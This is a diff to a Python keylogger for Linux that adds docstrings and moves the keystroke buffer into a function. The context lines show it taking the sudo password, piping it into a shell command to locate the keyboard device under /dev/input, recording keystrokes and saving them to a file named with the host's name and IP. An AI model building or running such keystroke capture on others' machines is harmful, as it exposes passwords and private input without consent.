@@ -160,11 +160,15 @@ KEY_DICTIONARY_MAP = {
 
 def __create_write_to_keylog_file(filename: str, buffer: str):
     """
-    A
+    Creates a .txt file and writes the recorded keystrokes from the buffer to it.
 
     :param filename:
+            A string representing the file name
+
     :param buffer:
-    :return:
+            A string containing the recorded keystrokes
+
+    :return: None
     """
     try:
         print(f"[+] CREATING FILE: Now creating keylog file...")
@@ -180,6 +184,13 @@ def __create_write_to_keylog_file(filename: str, buffer: str):
 
 
 def __create_file_name():
+    """
+    Generates a unique file name containing the hostname, IP address, and
+    a timestamp.
+
+    :return filename:
+        A string containing the formatted filename
+    """
     current_datetime = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
     hostname = socket.gethostname()
     ip_address = socket.gethostbyname(hostname)
@@ -189,6 +200,19 @@ def __create_file_name():
 
 
 def __get_kb_event(password: str, cmd: str):
+    """
+    Finds and returns the keyboard event from the user/host device in
+    "/dev/input" directory.
+
+    :param password:
+            A string containing host sudo password (required)
+
+    :param cmd:
+            A string containing the Linux command to find kb event
+
+    :return event_x:
+            A string representing the corresponding kb event
+    """
     try:
         event_x = ""
         result = subprocess.run(f"echo '{password}' | {cmd}",
@@ -227,8 +251,23 @@ def __get_kb_event(password: str, cmd: str):
 
 
 def __perform_keylog(event_x: str,
-                     stop: bool,
-                     buffer: str):
+                     stop: bool):
+    """
+    Performs keylogger logic and records each keystroke from user
+    into a buffer.
+
+    :param event_x:
+            A string representing the corresponding kb event
+
+    :param stop:
+            A boolean representing the signal used to stop keylogger
+
+    :return buffer:
+            A string containing the user recorded keystrokes
+    """
+    # Initialize empty buffer
+    buffer = ""
+
     try:
         # Initialize a variable to track the Shift key state
         capitalized = False
@@ -279,7 +318,6 @@ def __perform_keylog(event_x: str,
 if __name__ == '__main__':
     # Initialize Variables
     signal_stop = False
-    keylog_buffer = ""
 
     # Get the sudo password from the user
     sudo_password = getpass.getpass("[+] Enter your sudo password: ")
@@ -291,7 +329,7 @@ if __name__ == '__main__':
     event = __get_kb_event(sudo_password, command)
 
 # b) Perform keylogger by opening the "/dev/input/eventX" file in the read-binary mode
-    keylog_buffer = __perform_keylog(event, signal_stop, keylog_buffer)
+    keylog_buffer = __perform_keylog(event, signal_stop)
 
 # c) Get date and host information (for appending to .txt file name)
     file_name = __create_file_name()
